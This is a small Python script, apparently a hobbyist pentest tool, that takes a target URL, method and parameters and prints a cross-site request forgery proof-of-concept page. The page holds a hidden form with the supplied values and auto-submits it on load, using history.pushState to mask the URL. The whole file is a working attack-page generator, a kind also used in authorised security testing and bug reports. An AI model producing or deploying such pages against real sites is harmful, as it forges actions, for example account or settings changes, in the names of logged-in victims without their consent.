from termcolor import colored as c
from random import choice
csrf='''
░█████╗░░██████╗██████╗░███████╗
██╔══██╗██╔════╝██╔══██╗██╔════╝
██║░░╚═╝╚█████╗░██████╔╝█████╗░░
██║░░██╗░╚═══██╗██╔══██╗██╔══╝░░
╚█████╔╝██████╔╝██║░░██║██║░░░░░
░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░
'''
colors=['red','green','yellow','blue','magenta','cyan']
print(c(csrf,choice(colors)))
print(c("ⲢⲀⲂ𝓛0",choice(colors)))
print(c("_"*100,'yellow'))
inputs={}
print(c("enter the url and method: ex =>","blue"),c('https://www.google.com m=POST','yellow'))
url,method=input(c("URL >> ","red")).split(" m=")
print(c("enter params: ex=> ",'blue'),c("name=value",'yellow'),c('&','red'),c("name=value",'yellow'),sep='')
params=list(input(c("params >> ",'red')).split('&'))
Plen=len(params)
print(c("_"*100,"yellow")+'\n')
ht1=f'''<html>
 <!-- CSRF PoC BY PABL0 -->
 <body>
  <script>history.pushState('', '', '/')</script>
   <form action="{url}" method="{method.upper()}">'''
print(c(ht1,'red'))
for p in params:
 p,v=p.split('=')
 print(c('      <input type="hidden" name="'+p+'" value="'+v+'" />','red'))
ht2='''   </form>
   <script>
     document.forms[0].submit();
   </script>
 </body>
</html>'''
print(c(ht2,'red'))
print(c("_"*100,"yellow"))
